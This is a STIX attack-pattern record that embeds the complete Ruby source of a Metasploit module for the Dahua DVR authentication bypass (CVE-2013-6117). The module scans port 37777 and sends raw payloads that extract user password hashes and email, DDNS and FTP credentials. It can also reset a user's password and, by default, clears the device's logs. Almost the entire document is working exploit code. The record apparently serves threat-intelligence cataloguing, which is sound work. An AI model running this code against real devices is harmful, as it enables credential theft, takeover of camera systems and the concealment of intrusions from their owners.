{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--307e0d0b-3ffb-47f2-b21d-4a3b50a6feaf",
    "created": "2024-08-14T16:27:08.742233Z",
    "modified": "2024-08-14T16:27:08.742237Z",
    "name": "%q(Dahua DVR Auth Bypass Scanner)",
    "description": "(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a users password and clears the device logs)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/dahua_dvr_auth_bypass.rb",
            "external_id": "dahua_dvr_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6117"
        },
        {
            "source_name": "reference",
            "url": "https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'            => %q(Dahua DVR Auth Bypass Scanner),\n      'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),\n      'Author'          => [\n        'Tyler Bennett - Talos Consulting', # Metasploit module\n        'Jake Reynolds - Depth Security', # Vulnerability Discoverer\n        'Jon Hart <jon_hart[at]rapid7.com>', # improved metasploit module\n        'Nathan McBride' # regex extraordinaire\n      ],\n      'References'      => [\n        [ 'CVE', '2013-6117' ],\n        [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]\n      ],\n      'License'         => MSF_LICENSE,\n      'DefaultAction'  => 'VERSION',\n      'Actions'        =>\n        [\n          [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],\n          [ 'DDNS', { 'Description' => 'Obtain the DDNS settings from the DVR' } ],\n          [ 'EMAIL', { 'Description' => 'Obtain the email settings from the DVR' } ],\n          [ 'GROUP', { 'Description' => 'Obtain the group information the DVR' } ],\n          [ 'NAS', { 'Description' => 'Obtain the NAS settings from the DVR' } ],\n          [ 'RESET', { 'Description' => 'Reset an existing user\\'s password on the DVR' } ],\n          [ 'SERIAL', { 'Description' => 'Obtain the serial number from the DVR' } ],\n          [ 'USER', { 'Description' => 'Obtain the user information from the DVR' } ],\n          [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]\n        ]\n    )\n\n    register_options([\n      OptString.new('USERNAME', [false, 'A username to reset', '888888']),\n      OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),\n      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), true]),\n      Opt::RPORT(37777)\n    ])\n  end\n\n  U1 = \"\\xa1\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n       \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  DVR_RESP = \"\\xb1\\x00\\x00\\x58\\x00\\x00\\x00\\x00\"\n  # Payload to grab version of the DVR\n  VERSION = \"\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n            \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab Email Settings of the DVR\n  EMAIL = \"\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00\" \\\n          \"\\x0b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab DDNS Settings of the DVR\n  DDNS = \"\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00\" \\\n         \"\\x8c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab NAS Settings of the DVR\n  NAS = \"\\xa3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x6f\\x6e\\x66\\x69\\x67\\x00\\x00\" \\\n        \"\\x25\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab the Channels that each camera is assigned to on the  DVR\n  CHANNELS = \"\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n             \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n             \"\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n             \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab the Users Groups of the DVR\n  GROUPS = \"\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n           \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab the Users  and their hashes from the DVR\n  USERS = \"\\xa6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n          \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to grab the Serial Number of the DVR\n  SN = \"\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n       \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  # Payload to clear the logs of the DVR\n  CLEAR_LOGS1 = \"\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x90\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n               \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n  CLEAR_LOGS2 = \"\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n                \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n  def setup\n    @password = datastore['PASSWORD']\n    @password ||= Rex::Text.rand_text_alpha(6)\n  end\n\n  def grab_version\n    connect\n    sock.put(VERSION)\n    data = sock.get_once\n    return unless data =~ /[\\x00]{8,}([[:print:]]+)/\n    ver = Regexp.last_match[1]\n    print_good(\"#{peer} -- version: #{ver}\")\n  end\n\n  def grab_serial\n    connect\n    sock.put(SN)\n    data = sock.get_once\n    return unless data =~ /[\\x00]{8,}([[:print:]]+)/\n    serial = Regexp.last_match[1]\n    print_good(\"#{peer} -- serial number: #{serial}\")\n  end\n\n  def grab_email\n    connect\n    sock.put(EMAIL)\n    return unless (response = sock.get_once)\n    data = response.split('&&')\n    print_good(\"#{peer} -- Email Settings:\")\n    return unless data.first =~ /([\\x00]{8,}(?=.{1,255}$)[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?(?:\\.[0-9A-Z](?:(?:[0-9A-Z]|-){0,61}[0-9A-Z])?)*\\.?+:\\d+)/i\n    if mailhost = Regexp.last_match[1].split(':')\n      print_status(\"#{peer} --  Server: #{mailhost[0]}\") unless mailhost[0].blank?\n      print_status(\"#{peer} --  Server Port: #{mailhost[1]}\") unless mailhost[1].blank?\n      print_status(\"#{peer} --  Destination Email: #{data[1]}\") unless data[1].blank?\n      mailserver = \"#{mailhost[0]}\"\n      mailport = \"#{mailhost[1]}\"\n      muser = \"#{data[5]}\"\n      mpass = \"#{data[6]}\"\n    end\n    return if muser.blank? && mpass.blank?\n    print_good(\"  SMTP User: #{data[5]}\")\n    print_good(\"  SMTP Password: #{data[6]}\")\n    return unless mailserver.blank? && mailport.blank? && muser.blank? && mpass.blank?\n    report_email_cred(mailserver, mailport, muser, mpass)\n  end\n\n  def grab_ddns\n    connect\n    sock.put(DDNS)\n    return unless (response = sock.get_once)\n    data = response.split(/&&[0-1]&&/)\n    ddns_table = Rex::Text::Table.new(\n      'Header' => 'Dahua DDNS Settings',\n      'Indent' => 1,\n      'Columns' => ['Peer', 'DDNS Service', 'DDNS Server', 'DDNS Port', 'Domain', 'Username', 'Password']\n    )\n    data.each_with_index do |val, index|\n      next if index == 0\n      val = val.split(\"&&\")\n      ddns_service = val[0]\n      ddns_server = val[1]\n      ddns_port = val[2]\n      ddns_domain = val[3]\n      ddns_user = val[4]\n      ddns_pass = val[5]\n      ddns_table << [ peer, ddns_service, ddns_server, ddns_port, ddns_domain, ddns_user, ddns_pass ]\n      unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?\n        if datastore['VERBOSE']\n          ddns_table.print\n        end\n        report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)\n      end\n    end\n  end\n\n  def grab_nas\n    connect\n    sock.put(NAS)\n    return unless (data = sock.get_once)\n    print_good(\"#{peer} -- NAS Settings:\")\n    server = ''\n    port = ''\n    if data =~ /[\\x00]{8,}[\\x01][\\x00]{3,3}([\\x0-9a-f]{4,4})([\\x0-9a-f]{2,2})/\n      server = Regexp.last_match[1].unpack('C*').join('.')\n      port = Regexp.last_match[2].unpack('S')\n    end\n    if /[\\x00]{16,}(?<ftpuser>[[:print:]]+)[\\x00]{16,}(?<ftppass>[[:print:]]+)/ =~ data\n      ftpuser.strip!\n      ftppass.strip!\n      unless ftpuser.blank? || ftppass.blank?\n        print_good(\"#{peer} --  NAS Server: #{server}\")\n        print_good(\"#{peer} --  NAS Port: #{port}\")\n        print_good(\"#{peer} -- FTP User: #{ftpuser}\")\n        print_good(\"#{peer} -- FTP Pass: #{ftppass}\")\n        report_creds(\n          host: server,\n          port: port,\n          user: ftpuser,\n          pass: ftppass,\n          type: \"FTP\",\n          active: true)\n      end\n    end\n  end\n\n  def grab_channels\n    connect\n    sock.put(CHANNELS)\n    data = sock.get_once.split('&&')\n    channels_table = Rex::Text::Table.new(\n      'Header' => 'Dahua Camera Channels',\n      'Indent' => 1,\n      'Columns' => ['ID', 'Peer', 'Channels']\n    )\n    return unless data.length > 1\n    data.each_with_index do |val, index|\n      number = index.to_s\n      channels = val[/([[:print:]]+)/]\n      channels_table << [ number, peer, channels ]\n    end\n    channels_table.print\n  end\n\n  def grab_users\n    connect\n    sock.put(USERS)\n    return unless (response = sock.get_once)\n    data = response.split('&&')\n    usercount = 0\n    users_table = Rex::Text::Table.new(\n      'Header' => 'Dahua Users Hashes and Rights',\n      'Indent' => 1,\n      'Columns' => ['Peer', 'Username', 'Password Hash', 'Groups', 'Permissions', 'Description']\n    )\n    data.each do |val|\n      usercount += 1\n      user, md5hash, groups, rights, name = val.match(/^.*:(.*):(.*):(.*):(.*):(.*):(.*)$/).captures\n      users_table << [ peer, user, md5hash, groups, rights, name]\n      # Write the dahua hash to the database\n      hash = \"#{rhost} #{user}:$dahua$#{md5hash}\"\n      report_hash(rhost, rport, user, hash)\n      # Write the vulnerability to the database\n      report_vuln(\n        host: rhost,\n        port: rport,\n        proto: 'tcp',\n        sname: 'dvr',\n        name: 'Dahua Authentication Password Hash Exposure',\n        info: \"Obtained password hash for user #{user}: #{md5hash}\",\n        refs: references\n      )\n    end\n    users_table.print\n  end\n\n  def grab_groups\n    connect\n    sock.put(GROUPS)\n    return unless (response = sock.get_once)\n    data = response.split('&&')\n    groups_table = Rex::Text::Table.new(\n      'Header' => 'Dahua groups',\n      'Indent' => 1,\n      'Columns' => ['ID', 'Peer', 'Group']\n    )\n    data.each do |val|\n      number = \"#{val[/(([\\d]+))/]}\"\n      groups = \"#{val[/(([a-z]+))/]}\"\n      groups_table << [ number, peer, groups ]\n    end\n    groups_table.print\n  end\n\n  def reset_user\n    connect\n    userstring = datastore['USERNAME'] + \":Intel:\" + @password + \":\" + @password\n    u1 = \"\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n         \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    u2 = \"\\xa4\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n         \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    u3 = \"\\xa6\\x00\\x00\\x00#{userstring.length.chr}\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" \\\n         \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" + userstring\n    sock.put(u1)\n    sock.put(u2)\n    sock.put(u3)\n    sock.get_once\n    sock.put(u1)\n    return unless sock.get_once\n    print_good(\"#{peer} -- user #{datastore['USERNAME']}'s password reset to #{@password}\")\n  end\n\n  def clear_logs\n    connect\n    sock.put(CLEAR_LOGS1)\n    sock.put(CLEAR_LOGS2)\n    print_good(\"#{peer} -- logs cleared\")\n  end\n\n  def peer\n    \"#{rhost}:#{rport}\"\n  end\n\n  def run_host(_ip)\n    begin\n      connect\n      sock.put(U1)\n      data = sock.recv(8)\n      disconnect\n      return unless data == DVR_RESP\n      print_good(\"#{peer} -- Dahua-based DVR found\")\n      report_service(host: rhost, port: rport, sname: 'dvr', info: \"Dahua-based DVR\")\n\n      case action.name.upcase\n      when 'CHANNEL'\n        grab_channels\n      when 'DDNS'\n        grab_ddns\n      when 'EMAIL'\n        grab_email\n      when 'GROUP'\n        grab_groups\n      when 'NAS'\n        grab_nas\n      when 'RESET'\n        reset_user\n      when 'SERIAL'\n        grab_serial\n      when 'USER'\n        grab_users\n      when 'VERSION'\n        grab_version\n      end\n\n      clear_logs if datastore['CLEAR_LOGS']\n    ensure\n      disconnect\n    end\n  end\n\n  def report_hash(rhost, rport, user, hash)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'dahua_dvr',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :nonreplayable_hash,\n      jtr_format: 'dahua_hash',\n      username: user\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)\n    service_data = {\n      address: ddns_server,\n      port: ddns_port,\n      service_name: 'ddns settings',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: ddns_pass,\n      private_type: :password,\n      username: ddns_user\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def report_email_cred(mailserver, mailport, muser, mpass)\n    service_data = {\n      address: mailserver,\n      port: mailport,\n      service_name: 'email settings',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: mpass,\n      private_type: :password,\n      username: muser\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}